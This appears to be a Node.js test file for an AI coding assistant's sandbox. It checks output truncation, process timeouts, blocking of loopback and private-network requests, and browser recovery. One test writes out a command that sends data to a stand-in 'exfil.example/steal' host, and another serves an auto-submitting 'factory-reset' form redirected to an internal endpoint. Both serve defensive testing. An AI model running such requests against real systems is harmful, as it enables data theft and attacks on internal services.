import test from 'node:test';import assert from 'node:assert/strict';
import {spawn,execFileSync} from 'node:child_process';import {mkdtemp,mkdir,symlink,rm} from 'node:fs/promises';import {tmpdir} from 'node:os';import {join} from 'node:path';import {createServer} from 'node:http';import {fileURLToPath} from 'node:url';
import {CodingShell} from '../coding-shell.mjs';import {PrivateBrowser} from '../browser.mjs';import {ClaudeSession} from '../claude-session.mjs';
const here=name=>fileURLToPath(new URL('../'+name,import.meta.url));
const talk=(file,message)=>new Promise((resolve,reject)=>{const p=spawn(process.execPath,[file],{stdio:['pipe','pipe','pipe']});let out='';const timer=setTimeout(()=>{p.kill();reject(Error('no reply from '+file));},20000);p.stdout.on('data',x=>{out+=x;if(out.includes('\n')){clearTimeout(timer);p.kill();resolve(out.split('\n')[0]);}});p.on('error',reject);p.stdin.write(JSON.stringify(message)+'\n');});

test('a cut inside an emoji never produces a line the Mac app would drop',{skip:process.platform!=='darwin'},async()=>{
 const root=await mkdtemp('/tmp/buddy-frame-test-');await mkdir(root+'/project');
 try{
  // 63,999 letters then an emoji: the 64,000-character cut lands between the two halves of the emoji.
  const line=await talk(here('coding-shell.mjs'),{id:1,command:'run',cwd:root+'/project',scratch:root+'/scratch',code:`node -e "process.stdout.write('a'.repeat(63999)+String.fromCodePoint(0x1F600))"`});
  const frame=JSON.parse(line);assert.equal(frame.id,1,line.slice(0,200));
  assert.equal(frame.result.output.isWellFormed(),true,'no lone surrogate reaches the Mac app');
  assert.ok(frame.result.output.length<=64100,'long output stays bounded');
  // The start of long output is kept up to 16,000 characters: here that cut lands between the two halves of the emoji.
  const head=JSON.parse(await talk(here('coding-shell.mjs'),{id:2,command:'run',cwd:root+'/project',scratch:root+'/scratch',code:`node -e "process.stdout.write('a'.repeat(15999)+String.fromCodePoint(0x1F600)+'b'.repeat(60000))"`}));
  assert.equal(head.result.output.isWellFormed(),true,'a cut at the end of the kept start is well formed too');
 }finally{await rm(root,{recursive:true,force:true});}
});
test('the coding runner starts through a symlinked path',{skip:process.platform!=='darwin'},async()=>{
 const root=await mkdtemp('/tmp/buddy-link-test-');await mkdir(root+'/project');
 try{
  await symlink(here('coding-shell.mjs'),root+'/runner.mjs');
  const frame=JSON.parse(await talk(root+'/runner.mjs',{id:7,command:'run',cwd:root+'/project',scratch:root+'/scratch',code:'echo linked-ok'}));
  assert.equal(frame.id,7);assert.match(frame.result.output,/linked-ok/);
 }finally{await rm(root,{recursive:true,force:true});}
});
test('a command whose background process outlives it cannot hold the runner past its timeout',{skip:process.platform!=='darwin',timeout:30000},async()=>{
 const root=await mkdtemp('/tmp/buddy-escape-test-'),shell=new CodingShell();await mkdir(root+'/project');
 try{
  const started=Date.now();
  const result=await shell.run({cwd:root+'/project',scratch:root+'/scratch',timeoutSeconds:2,code:`perl -e 'use POSIX; if(fork()==0){POSIX::setsid(); exec("sleep","25")} print "started\\n"'`});
  assert.ok(Date.now()-started<6000,`finished in ${Date.now()-started} ms, not when the background process ended`);
  assert.match(result.output,/started/);
  // The runner is free again straight away.
  const next=await shell.run({cwd:root+'/project',scratch:root+'/scratch',code:'echo free'});assert.match(next.output,/free/);
 }finally{shell.close();try{execFileSync('pkill',['-f','sleep 25']);}catch{}await rm(root,{recursive:true,force:true});}
});

test('without network access a command cannot reach a service on this Mac, such as a local proxy that forwards to the internet',{skip:process.platform!=='darwin',timeout:60000},async()=>{
 const root=await mkdtemp('/tmp/buddy-loopback-test-'),shell=new CodingShell();await mkdir(root+'/project');
 const hits=[];const proxy=createServer((req,res)=>{hits.push(req.url);res.end('forwarded');});await new Promise(r=>proxy.listen(0,'127.0.0.1',r));
 const through=`node -e 'const r=require("http").request({host:"127.0.0.1",port:${proxy.address().port},path:"http://exfil.example/steal",headers:{Host:"exfil.example"}},res=>{res.on("data",x=>console.log("GOT "+x));res.on("end",()=>process.exit(0))});r.on("error",e=>{console.log("ERR "+e.code);process.exit(3)});r.end()'`;
 try{
  let result=await shell.run({cwd:root+'/project',scratch:root+'/scratch',code:through});
  assert.match(result.output,/ERR EPERM/,result.output);assert.notEqual(result.exitCode,0);assert.deepEqual(hits,[],'the proxy never saw the request');
  result=await shell.run({cwd:root+'/project',scratch:root+'/scratch',code:through,network:true});
  assert.match(result.output,/GOT forwarded/,'after review (network access) the same command works');assert.deepEqual(hits,['http://exfil.example/steal']);
 }finally{shell.close();proxy.close();await rm(root,{recursive:true,force:true});}
});

function pages(){return createServer((req,res)=>{res.setHeader('Content-Type','text/html');res.end(req.url.startsWith('/spin')?'<title>spin</title><script>for(;;){}</script>':'<title>fine</title><h1>All good</h1>');});}
const redirectTest=ROUTES=>async()=>{
 const inside=[];   // what reached the "internal" service
 const internal=createServer(async(req,res)=>{let body='';for await(const chunk of req)body+=chunk;inside.push(req.method+' '+req.url+' '+body);res.setHeader('Content-Type','text/html');res.end('<title>INTERNAL</title><p>internal secret</p>');});
 internal.on('upgrade',(req,socket)=>{inside.push('UPGRADE '+req.url);socket.on('error',()=>{});socket.destroy();});
 await new Promise(r=>internal.listen(0,'127.0.0.1',r));const target=`http://127.0.0.1:${internal.address().port}/reboot`;
 const site=createServer((req,res)=>{
  res.setHeader('Content-Type','text/html');
  if(req.url==='/go'){res.statusCode=302;res.setHeader('Location',target);res.end();return;}
  if(req.url==='/chain'){res.statusCode=302;res.setHeader('Location','/chain2');res.end();return;}
  if(req.url==='/chain2'){res.statusCode=307;res.setHeader('Location',target);res.end();return;}
  if(req.url==='/form'){res.end('<title>form</title><form id=f method=post action=/r307><input name=cmd value=factory-reset></form><script>document.getElementById("f").submit()</script>');return;}
  if(req.url==='/r307'){res.statusCode=307;res.setHeader('Location',target);res.end();return;}
  if(req.url==='/legit'){res.statusCode=302;res.setHeader('Location','/ok');res.end();return;}
  if(['/img302','/frame302','/xhr302','/script302'].includes(req.url)){res.statusCode=302;res.setHeader('Location',target);res.end();return;}
  if(req.url==='/sub'){res.end(`<title>sub</title><img src="/img302"><iframe src="/frame302"></iframe><script src="/script302"></script><script>fetch('/xhr302',{mode:'no-cors'}).catch(()=>{});try{new WebSocket('ws://127.0.0.1:${internal.address().port}/socket')}catch(e){}try{new WebSocket('ws://127.0.0.1:${internal.address().port}/socket2')}catch(e){}</script>`);return;}
  res.end('<title>fine</title><h1>All good</h1>');
 });
 await new Promise(r=>site.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${site.address().port}`,root=await mkdtemp(join(tmpdir(),'buddy-redirect-test-'));
 const b=new PrivateBrowser(join(root,'profile'),{testOrigin:origin});
 try{
  for(const path of ROUTES){try{await b.navigate(origin+path);}catch{}await new Promise(r=>setTimeout(r,1200));}
  assert.deepEqual(inside,[],'nothing reached the internal service: no redirected GET, no redirected POST'+(ROUTES.includes('/chain')?', no second hop':''));
  const page=await b.navigate(origin+'/legit');assert.match(JSON.stringify(page),/All good|fine/,'an ordinary redirect within the public site still works');
 }finally{await b.close().catch(()=>{});site.close();internal.close();await rm(root,{recursive:true,force:true});}
};
test('a redirect from a public page cannot send the browser, or a form POST, on to the private network',{timeout:90000},redirectTest(['/go','/form']));
// Every request Chrome makes goes through the checking proxy, so later hops of a chain and everything a page loads are checked as well.
test('a chain of redirects that ends in the private network is refused',{timeout:90000},redirectTest(['/chain']));
test('images, frames, scripts, fetches and sockets that point at the private network are refused too',{timeout:90000},redirectTest(['/sub']));
test('Chrome is launched through the checking proxy with its localhost exemption removed',async()=>{
 const {readFile}=await import('node:fs/promises');const source=await readFile(here('browser.mjs'),'utf8');
 assert.match(source,/proxy:\{server:this\.netGuard\.server,username:this\.netGuard\.username,password:this\.netGuard\.password,bypass:'<-loopback>'\}/,'the proxy and the loopback bypass override are both set');
 assert.match(source,/--force-webrtc-ip-handling-policy=disable_non_proxied_udp/,'WebRTC cannot send UDP around the proxy');
});
test('a page that never yields cannot block the private browser for good',{timeout:60000},async()=>{
 const server=pages();await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`,root=await mkdtemp(join(tmpdir(),'buddy-spin-test-'));
 const b=new PrivateBrowser(join(root,'profile'),{testOrigin:origin,commandDeadlineMs:2000});
 try{
  await assert.rejects(()=>b.navigate(origin+'/spin'),/stopped responding/);
  const page=await b.navigate(origin+'/ok');assert.match(JSON.stringify(page),/All good|fine/,'the next command works on a fresh browser');
 }finally{await b.close().catch(()=>{});server.close();await rm(root,{recursive:true,force:true});}
});
test('after Chrome dies the next command starts a new one',{timeout:60000},async()=>{
 const server=pages();await new Promise(r=>server.listen(0,'127.0.0.1',r));const origin=`http://127.0.0.1:${server.address().port}`,root=await mkdtemp(join(tmpdir(),'buddy-crash-test-'));
 const b=new PrivateBrowser(join(root,'profile'),{testOrigin:origin});
 try{
  await b.navigate(origin+'/ok');
  try{execFileSync('pkill',['-9','-f','user-data-dir='+b.profile]);}catch{}
  await new Promise(r=>setTimeout(r,1500));
  const page=await b.navigate(origin+'/ok');assert.match(JSON.stringify(page),/All good|fine/);
 }finally{await b.close().catch(()=>{});server.close();await rm(root,{recursive:true,force:true});}
});

test('a Claude run that ends in a failed result reports its cost before the error that ends the task',async()=>{
 const events=[];
 const host=new ClaudeSession({startup:async({options})=>({options,close(){},query(){return {async *[Symbol.asyncIterator](){
  yield {type:'result',subtype:'error_max_turns',is_error:true,errors:[],total_cost_usd:0.21};throw Error('Claude exited with code 1');},close(){}};}}),tool:(n,d,s,call)=>({name:n,call}),createSdkMcpServer:x=>x,fromJSONSchema:()=>({shape:{}}),write:x=>events.push(x)});
 await host.start({command:'start',apiKey:'fixture-key',budget:0.5,home:'/fixture/config',cwd:'/fixture',instructions:'x',tools:[],prompt:'go',runId:'r1'});
 await new Promise(r=>setTimeout(r,100));
 const kinds=events.filter(e=>['result','error'].includes(e.type)).map(e=>e.type);
 assert.deepEqual(kinds,['result','error'],'the charged result is delivered first, once');
 const result=events.find(e=>e.type==='result');assert.equal(result.cost,0.21);assert.match(result.error,/limit on steps/,'a failed result names its reason in plain words, not "success" or a raw code');
});
